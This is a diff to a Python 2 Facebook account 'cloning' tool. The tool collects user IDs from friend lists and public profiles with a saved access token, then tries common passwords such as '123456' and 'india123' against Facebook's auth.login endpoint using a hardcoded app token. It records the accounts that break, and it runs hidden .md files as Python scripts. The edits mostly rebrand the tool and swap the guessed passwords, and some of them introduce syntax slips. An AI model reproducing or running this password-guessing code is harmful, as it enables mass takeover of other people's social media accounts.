@@ -13,7 +13,7 @@ except ImportError:
     os.system("pip install mechanize")
     os.system("pip2 install nodejs")
     os.system("pip2 install npm")
-    os.system("python2 2.py")
+
 try:
     os.mkdir('save')
 except OSError:
@@ -51,15 +51,15 @@ def abm(z):
 def logging():
     titik = [".   ", "..  ", "... "]
     for o in titik:
-        print("\r\033[1;32m[+] Logging In\033[0;97m " + o),;
-        sys.stdout.flush();
+        print("\r\033[1;32m[+] Logging In\033[0;97m ]" + o), ;
+        sys.stdout.flush() ;
         time.sleep(1)
 
 
 def saving():
     titik = [".   ", "..  ", "... "]
     for o in titik:
-        print("\r\033[1;32m[+] Saving Token\033[0;97m " + o),;
+        print("\r\033[1;32m[+] Saving Token\033[0;97m] " + o),;
         sys.stdout.flush();
         time.sleep(1)
 
@@ -93,8 +93,7 @@ logo = """
 \033[1;93m➤\033[1;97m Author   : SUNNY_TECH
 \033[1;93m➤\033[1;97m Github   : https://github.com/devBoss11
 \033[1;93m➤\033[1;97m Fb Id  : https://facebook.com/sunny.sachan.777
-\033[1;97m--------------------------------------------------
-"""
+\033[1;97m-------------------------------------------------- """
 
 idh = []
 
@@ -103,7 +102,7 @@ def sunny_tech():
     os.system("clear")
     print
     logo
-    print("\033[1;93mFirst Tool login").center(50)
+    print("\033[1;93mWELCOME TO MY FB CLONING ").center(50)
     print('')
     print("\033[1;97m--------------------------------------------------")
     username = raw_input("\033[1;97m[+]\033[1;97m Username :\033[1;97m ")
@@ -111,9 +110,9 @@ def sunny_tech():
         os.system("clear")
         print
         logo
-        print("[+] Username : sunny (Correct)")
+        print("[+] Username : ROSHAN BHAI (Correct)")
         passwordss = raw_input("\033[1;97m[+]\033[1;97m Password :\033[1;97m ")
-        if passwordss == "tech":
+        if passwordss == "roshan":
             os.system("clear")
             print
             logo
@@ -122,7 +121,7 @@ def sunny_tech():
             print
             logo
             print("\033[1;97m[+]\033[1;92m Username : sunny\033[1;92m (Correct)")
-            print("\033[1;97m[+]\033[1;92m Password : tech\033[1;92m (Correct)")
+            print("\033[1;97m[+]\033[1;92m Password : roshan\033[1;92m (Correct)")
             print("\033[1;97m--------------------------------------------------")
             time.sleep(1)
             print('')
@@ -165,7 +164,7 @@ def login_choice():
 
 
 def clone_main():
-    hack = raw_input("\n╰─➣ ")
+    hack = raw_input("\n ")
     if hack == "1":
         os.system("python2 .name.md")
         time.sleep(1)
@@ -194,13 +193,14 @@ def loginvia():
     logo
     print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mlogin With Access Token ")
     print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mLogin With User And Pass")
+    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mLogin With cockess")
     print("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack")
     print("\033[1;97m--------------------------------------------------")
     clone_loginvia()
 
 
 def clone_loginvia():
-    hack = raw_input("\n╰─➣ ")
+    hack = raw_input("\n ")
     if hack == "1":
         os.system("clear")
         print
@@ -218,7 +218,7 @@ def clone_loginvia():
         sav.write(token)
         sav.close()
         abm("\r\033[1;92m[✓] Login Successfull\033[0;97m")
-        os.system('xdg-open https://m.facebook.com/sunny.tech.777')
+        os.system('xdg-open https://m.facebook.com/sunny.sachan.777')
         time.sleep(1)
         menu()
     elif hack == "2":
@@ -262,7 +262,7 @@ def loginfb():
         menu()
     else:
         if "www.facebook.com" in q["error_msg"]:
-            print("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
+            print("\n\033[1;31m[!] Login Failed . Account Has a disable\033[0;97m")
             time.sleep(1)
             loginfb()
         else:
@@ -304,18 +304,18 @@ def menu():
     print("\t  \033[1;93m[+] Name : " + name)
     print("\033[1;97m--------------------------------------------------")
     print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mClone Frienlist and Public ID")
-    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mClone India")
+    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mClone India Cloning")
     print("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mlogout")
     print("\033[1;97m--------------------------------------------------")
     menu_select()
 
 
 def menu_select():
-    option = raw_input("\n╰─➣ ")
+    option = raw_input("\n")
     if option == "1":
         crack()
     if option == "2":
-        bangla_india()
+        n_india()
     elif option == "0":
         logout()
         os.system("rm -rf .login.txt")
@@ -353,10 +353,10 @@ def crack():
 
 
 def crack2():
-    select = raw_input("\n╰─➣ ")
-    id = []
-    oks = []
-    cps = []
+    select = raw_input("\n ")
+    id = [ ]
+    oks = [ ]
+    cps = [ ]
     if select == "1":
         os.system("clear")
         print
@@ -405,7 +405,7 @@ def crack2():
         idt = raw_input("\033[1;97m[+]\033[1;97m Input ID :\033[1;93m ")
         print("\033[1;97m--------------------------------------------------")
         os.system("clear")
-        print
+        print( "Not Found")
         logo
         try:
             r = requests.get("https://graph.facebook.com/" + idt + "?access_token=" + token, headers=header)
@@ -517,7 +517,7 @@ def crack2():
                                             ok.close()
                                             oks.append(uid)
                                         else:
-                                            pass5 = "786786"
+                                            pass5 = "123456"
                                             q = requests.get(
                                                 "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c",
                                                 headers=header).text
@@ -538,7 +538,7 @@ def crack2():
                                                     ok.close()
                                                     oks.append(uid)
                                                 else:
-                                                    pass6 = "786000"
+                                                    pass6 = "12345678"
                                                     q = requests.get(
                                                         "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c",
                                                         headers=header).text
@@ -610,7 +610,7 @@ def n_india():
 
 
 def n_india_man():
-    option = raw_input("\n╰─➣ ")
+    option = raw_input("\n ")
     if option == "1":
         bangla()
     if option == "2":
@@ -620,34 +620,6 @@ def n_india_man():
     else:
         print("[!] Please Select a Valid Option")
         n_india_man()
-
-
-def bangla():
-    global token
-    os.system("clear")
-    try:
-        token = open(".login.txt", "r").read()
-    except IOError:
-        print("[!] Error 404 . Token Not Found")
-        os.system("rm -rf .login.txt")
-        time.sleep(1)
-        login()
-    os.system("clear")
-    print
-    logo
-    os.system("python3 .loading.md")
-    os.system('clear')
-    print
-    logo
-    print("\t   Bangladesh Menu")
-    print("\033[1;97m--------------------------------------------------")
-    print("\033[1;97m[1]\033[1;91m-⋄-\033[1;93mCrack From Friend List")
-    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;93mCrack From Public ID")
-    print("\033[1;97m[3]\033[1;91m-⋄-\033[1;93mCrack From Followers")
-    print('\033[1;97m[0]\033[1;91m-⋄-\033[1;93mBack')
-    print("\033[1;97m--------------------------------------------------")
-    bangla2()
-
 
 def bangla2():
     select = raw_input("\n╰─➣ ")
@@ -835,7 +807,7 @@ def bangla2():
                                                     ok.close()
                                                     oks.append(uid)
                                                 else:
-                                                    pass6 = "000786"
+                                                    pass6 = "123456"
                                                     q = requests.get(
                                                         "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c",
                                                         headers=header).text
@@ -856,7 +828,7 @@ def bangla2():
                                                             ok.close()
                                                             oks.append(uid)
                                                         else:
-                                                            pass7 = "india"
+                                                            pass7 = "india123"
                                                             q = requests.get(
                                                                 "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c",
                                                                 headers=header).text
@@ -905,7 +877,7 @@ def indiaa():
     os.system("clear")
     print
     logo
-    os.system("python3 .loading.md")
+    os.system("python2 .loading.md")
     os.system('clear')
     print
     logo
